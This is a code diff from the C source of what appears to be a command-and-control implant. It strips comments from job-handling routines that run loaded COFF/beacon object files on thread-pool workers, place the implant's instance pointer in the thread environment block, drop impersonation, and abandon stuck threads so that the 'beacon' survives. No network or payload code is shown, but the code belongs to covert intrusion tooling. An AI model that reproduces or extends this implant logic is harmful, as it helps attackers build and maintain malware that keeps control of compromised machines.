@@ -123,7 +123,6 @@ static VOID CALLBACK NaxJobThreadProc( PTP_CALLBACK_INSTANCE Inst, PVOID Context
     (void)Inst; (void)Work;
     NAX_JOB* job = (NAX_JOB*)Context;
 
-    /* propagate NAX_INSTANCE to this thread's TEB so G_INSTANCE works */
     PNAX_INSTANCE Nax = job->Nax;
     NaxCurrentTeb()->NtTib.ArbitraryUserPointer = (PVOID)Nax;
 
@@ -140,7 +139,6 @@ static VOID CALLBACK NaxJobThreadProc( PTP_CALLBACK_INSTANCE Inst, PVOID Context
     if ( Nax->Advapi32.RevertToSelf )
         Nax->Advapi32.RevertToSelf();
 
-    /* watchdog may have abandoned us - clean up our copies, signal done, return to pool */
     if ( job->Abandoned ) {
         MmZero( job->CoffCopy, job->CoffSize );
         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
@@ -153,7 +151,6 @@ static VOID CALLBACK NaxJobThreadProc( PTP_CALLBACK_INSTANCE Inst, PVOID Context
         return;
     }
 
-    /* zero+free COFF copy */
     MmZero( job->CoffCopy, job->CoffSize );
     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->CoffCopy );
     job->CoffCopy = NULL;
@@ -202,9 +199,6 @@ FUNC INT NaxJobKill( PNAX_INSTANCE Nax, UINT32 taskId ) {
     if ( job->hThread ) {
         DWORD w = Nax->Kernel32.WaitForSingleObject( job->hThread, JOB_GRACE_PERIOD_MS );
         if ( w != WAIT_OBJECT_0 ) {
-            /* Thread is stuck. TerminateThread on a pool worker corrupts ntdll's
-             * thread pool and crashes the process - abandon the thread instead.
-             * The leaked resources are a few KB; a dead beacon is worse. */
             job->Abandoned = TRUE;
 
             NaxDbg( Nax, "[job] abandoned taskId=0x%08x (thread still alive)", taskId );
@@ -227,7 +221,6 @@ FUNC UINT32 NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
     while ( *pp ) {
         NAX_JOB* job = *pp;
 
-        /* ---- abandoned: thread still alive after kill, kept in list for NaxFindCurrentJob ---- */
         if ( job->State == NAX_JOB_ABANDONED ) {
             if ( job->Abandoned >= 2 ) {
                 NaxDbg( Nax, "[job] abandoned thread done taskId=0x%08x", job->TaskId );
@@ -292,12 +285,10 @@ FUNC UINT32 NaxProcessJobs( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
         written += 9 + data_len;
 
         if ( job->Abandoned ) {
-            /* thread still alive - keep in list so NaxFindCurrentJob + sleepmask see it */
             job->State = NAX_JOB_ABANDONED;
             NaxDbg( Nax, "[job] abandoned taskId=0x%08x (kept in list)", job->TaskId );
             pp = &job->Next;
         } else {
-            /* unlink + free */
             *pp = job->Next;
             if ( job->BofCtx.Buf ) Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, job->BofCtx.Buf );
             JobFreeMedia( Nax, job->BofCtx.MediaHead );
